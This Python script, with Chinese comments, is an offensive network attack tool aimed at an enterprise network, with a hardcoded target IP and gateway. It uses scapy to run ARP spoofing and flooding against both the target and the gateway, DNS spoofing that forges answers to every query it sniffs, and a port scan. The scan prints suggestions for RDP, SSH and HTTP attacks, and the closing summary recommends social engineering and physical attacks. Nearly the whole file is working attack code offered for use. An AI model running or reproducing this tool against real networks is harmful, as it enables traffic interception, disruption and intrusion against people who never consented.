#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简化版高级攻击工具
针对有防护的企业网络
"""

import threading
import time
import socket
import subprocess
from scapy.all import *

class SimpleAdvancedAttack:
    def __init__(self):
        self.target_ip = "10.30.58.185"
        self.gateway_ip = "10.30.255.254"
        self.local_ip = socket.gethostbyname(socket.gethostname())
        self.attack_running = False
    
    def network_diagnosis(self):
        """网络诊断"""
        print("🔍 网络诊断报告")
        print("=" * 50)
        
        print(f"本机IP: {self.local_ip}")
        print(f"目标IP: {self.target_ip}")
        print(f"网关IP: {self.gateway_ip}")
        
        # 检查网络连通性
        print("\n📡 网络连通性检查:")
        
        # 检查网关
        try:
            result = subprocess.run(['ping', '-n', '2', self.gateway_ip], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print("✅ 网关可达")
            else:
                print("❌ 网关不可达")
        except:
            print("❌ 网关检查失败")
        
        # 检查目标
        try:
            result = subprocess.run(['ping', '-n', '2', self.target_ip], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print("✅ 目标设备在线")
            else:
                print("❌ 目标设备无响应")
                print("💡 目标设备可能关机或网络隔离")
        except:
            print("❌ 目标检查失败")
        
        # 网络段分析
        local_segment = '.'.join(self.local_ip.split('.')[:3])
        target_segment = '.'.join(self.target_ip.split('.')[:3])
        
        print(f"\n🌐 网络段分析:")
        print(f"本机网络段: {local_segment}.x")
        print(f"目标网络段: {target_segment}.x")
        
        if local_segment == target_segment:
            print("✅ 同一网络段")
        else:
            print("❌ 不同网络段")
            print("💡 可能存在VLAN隔离")
    
    def arp_flood_attack(self):
        """ARP洪水攻击"""
        print("\n🎯 启动ARP洪水攻击")
        
        local_mac = "10:5F:AD:63:83:40"  # 您的MAC
        packet_count = 0
        
        while self.attack_running and packet_count < 500:
            try:
                # 创建多种ARP包
                
                # 类型1: 网关欺骗
                pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2, psrc=self.gateway_ip, pdst=self.target_ip,
                    hwsrc=local_mac, hwdst="ff:ff:ff:ff:ff:ff"
                )
                
                # 类型2: 目标欺骗
                pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2, psrc=self.target_ip, pdst=self.gateway_ip,
                    hwsrc=local_mac, hwdst="ff:ff:ff:ff:ff:ff"
                )
                
                # 类型3: 免费ARP
                pkt3 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2, pdst=self.gateway_ip, psrc=self.gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff", hwsrc=local_mac
                )
                
                # 发送ARP包
                sendp(pkt1, verbose=False)
                sendp(pkt2, verbose=False)
                sendp(pkt3, verbose=False)
                
                packet_count += 3
                
                if packet_count % 30 == 0:
                    print(f"   📊 已发送 {packet_count} 个ARP包")
                
                time.sleep(0.05)  # 快速发送
                
            except Exception as e:
                print(f"   ❌ ARP错误: {e}")
                time.sleep(1)
        
        print("   ✅ ARP洪水攻击完成")
    
    def dns_spoof_attack(self):
        """DNS欺骗攻击"""
        print("\n🎯 启动DNS欺骗攻击")
        
        def spoof_dns(pkt):
            if pkt.haslayer(DNSQR):
                # 创建虚假DNS响应
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                             UDP(dport=pkt[UDP].sport, sport=53)/\
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                         ttl=300, rdata="8.8.8.8"))
                
                send(spoofed_pkt, verbose=False)
                print(f"   🔧 DNS欺骗: {pkt[DNS].qd.qname} -> 8.8.8.8")
        
        try:
            # 监听DNS流量60秒
            sniff(filter="udp port 53", prn=spoof_dns, store=0, timeout=60)
        except Exception as e:
            print(f"   ❌ DNS欺骗失败: {e}")
    
    def port_scan_attack(self):
        """端口扫描攻击"""
        print("\n🎯 启动端口扫描")
        
        # 常见服务端口
        ports_to_scan = [21, 22, 23, 53, 80, 443, 8080, 3389, 5900]
        
        open_ports = []
        
        for port in ports_to_scan:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((self.target_ip, port))
                
                if result == 0:
                    open_ports.append(port)
                    print(f"   ✅ 端口 {port} 开放")
                else:
                    print(f"   ❌ 端口 {port} 关闭")
                
                sock.close()
                
            except Exception as e:
                print(f"   ❌ 端口 {port} 扫描失败: {e}")
        
        if open_ports:
            print(f"   📊 发现开放端口: {open_ports}")
            
            # 根据开放端口提供攻击建议
            if 80 in open_ports or 443 in open_ports:
                print("   💡 可以尝试HTTP/HTTPS攻击")
            if 3389 in open_ports:
                print("   💡 可以尝试RDP攻击")
            if 22 in open_ports:
                print("   💡 可以尝试SSH攻击")
        else:
            print("   💡 未发现开放端口")
    
    def run_attacks(self):
        """运行所有攻击"""
        print("=" * 70)
        print("          简化版高级攻击工具")
        print("=" * 70)
        
        # 网络诊断
        self.network_diagnosis()
        
        print("\n💡 根据诊断结果，您的网络有企业级防护")
        print("💡 启动高级攻击组合...")
        
        self.attack_running = True
        
        # 创建攻击线程
        threads = []
        
        # ARP洪水攻击
        t1 = threading.Thread(target=self.arp_flood_attack)
        threads.append(t1)
        
        # DNS欺骗攻击
        t2 = threading.Thread(target=self.dns_spoof_attack)
        threads.append(t2)
        
        # 端口扫描
        t3 = threading.Thread(target=self.port_scan_attack)
        threads.append(t3)
        
        # 启动所有线程
        for t in threads:
            t.daemon = True
            t.start()
        
        # 运行45秒
        print("\n⏰ 攻击运行中 (45秒)...")
        for i in range(45):
            if not self.attack_running:
                break
            if (45-i) % 15 == 0:
                print(f"   {45-i}秒后停止...")
            time.sleep(1)
        
        self.attack_running = False
        print("\n✅ 所有攻击已停止")
        
        # 等待线程结束
        for t in threads:
            t.join(timeout=5)
        
        print("\n🔧 攻击总结:")
        print("💡 在企业级防护网络中，传统ARP欺骗可能无效")
        print("💡 建议尝试其他攻击方法:")
        print("   1. 社会工程学攻击")
        print("   2. 无线网络攻击（如果有WiFi）")
        print("   3. 物理访问攻击")
        print("   4. 漏洞利用攻击")
    
    def stop_attacks(self):
        """停止攻击"""
        self.attack_running = False
        print("\n🛑 停止所有攻击")

def main():
    """主函数"""
    attack = SimpleAdvancedAttack()
    
    try:
        attack.run_attacks()
    except KeyboardInterrupt:
        attack.stop_attacks()
    except Exception as e:
        print(f"❌ 攻击失败: {e}")

if __name__ == "__main__":
    main()